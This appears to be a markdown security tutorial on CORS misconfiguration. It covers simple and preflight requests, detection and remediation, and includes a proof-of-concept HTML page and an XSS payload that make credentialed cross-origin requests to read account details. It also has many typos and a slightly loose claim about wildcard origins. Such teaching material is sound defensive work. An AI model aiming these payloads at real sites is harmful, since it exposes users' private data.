# CORS

## Information

Cross-Origin Resource Sharing(CORS) is a mechanism that enables web browsers to perform cross-domain requests using the XMLHttpRequest API in a controlled manner.

Without CORS, websites are restricted to accessing resources from the same origin through what is known as ***same-origin policy***

OWASP TOP 10: A6-Security Misconfiguration vulnerability

## CORS Request

There are two types of CORS requests:
   1. Simple requests
   2. Preflighted requests.

 ### 1. Simple requests
 
**Example:** Web browser sends AJAX **GET** `https:///api.account_detaild` request to `api.mywebsite.com` containing the domain that served the parent page, Consider the below Request.

```
GET /api/account_detaild HTTP/1.1
Host: www.mywebsite.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: www.mywebsite.com

```
The web client inform to server its source domain using the HTTP request header "Origin". 

You get below response with the **Access-Control-Allow-Origin** header setting. 
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 00:2:03 GMT
Content-Type: application/xml
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: www.mywebsite.com 
```
🏁 The header is configured with `Access-Control-Allow-Origin: www.mywebsite.com` It means ***Only***✔️ `www.mywebsite.com` domain can access the resources.

🏴‍☠️ IF header is configured with a wildcard **`( * )`**. It means **Any domain**☢️  can access the resources.
```
HTTP/1.1 200 OK
Date: Sat, 16 May 2020 00:2:03 GMT
Content-Type: application/xml
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
```

🏴 IF the server does not allow a cross-origin request then you will get error⚠️ page

 ### 2. Preflighted requests

***Preflight request*** is a CORS request that checks to see IF the CORS protocol is understood and a server is aware using specific methods and headers.

It is OPTIONS method request using three HTTP request headers: `Access-Control-Request-Method`, `Access-Control-Request-Headers` & `Origin` header.

When performing certain types of cross-domain AJAX requests, browser first sends an HTTP request using the OPTIONS method (which is called as "preflight" request) to determine whether they have permission to perform the action or IF the actual request is safe to send. CORS requests are preflighted this way because they may have implications to user data.

**Example:** Browser send request to server and check IF it would allow a DELETE request, before sending a DELETE request, by using a preflight request:
```
OPTIONS /api/account_detaild
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: origin, x-requested-with
Origin: www.mywebsite.com 
```
IF the server allows this⬆️ request, then it will respond to the preflight request with `Access-Control-Allow-Methods` response header, which lists `DELETE`

```
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: www.mywebsite.com 
Access-Control-Allow-Methods: POST, PUT, OPTIONS, DELETE
Access-Control-Max-Age: 223000
```
🏴 IF the server does not allow a cross-origin request then you will get error⚠️ to the OPTIONS request and the browser will not make the actual request.

## Detect CORS misconfiguration     

Identify Response **Access-Control-Allow-Origin** Header 

1. CORS misconfiguration using wildcards such as (*)
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: * 
```
2. Origin with Other Domain.
```
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: vulnerablesite.com 
```


## POC - Exploite Code
1. Mentioned below is the exploit code to exploit misconfigured ***Simple requests*** CORS

```javascript
<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://www.website.com/api/account_detaild", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS - POC Exploit </h2>
      <button type="button" onclick="cors()">Exploit CORS</button>
   </body>
</html>
```

2. You can exploit this misconfiguration CORS using XSS so just replace payload <scropt>**alert(document.domain)**</script> 
    
    - XSS Payload for Exploite CORS:
```javascript
<script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200)alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.website.com/api/account_detaild",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
```


## Remediation

* Allow only **Trusted domains** `Access-Control-Allow-Origin: <origin>` header.
  
  Example: `Access-Control-Allow-Origin: https://www.mywebsite.com`

* Avoid whitelisting null `Access-Control-Allow-Origin: null`

* CORS defines browser behaviors and is never a replacing for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data such as authentication and session management, in addition to properly configured CORS

## Refrence

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

- https://hackerone.com/reports/470298 

- https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397

- https://www.moesif.com/blog/technical/cors/Authoritative-Guide-to-CORS-Cross-Origin-Resource-Sharing-for-REST-APIs/ 
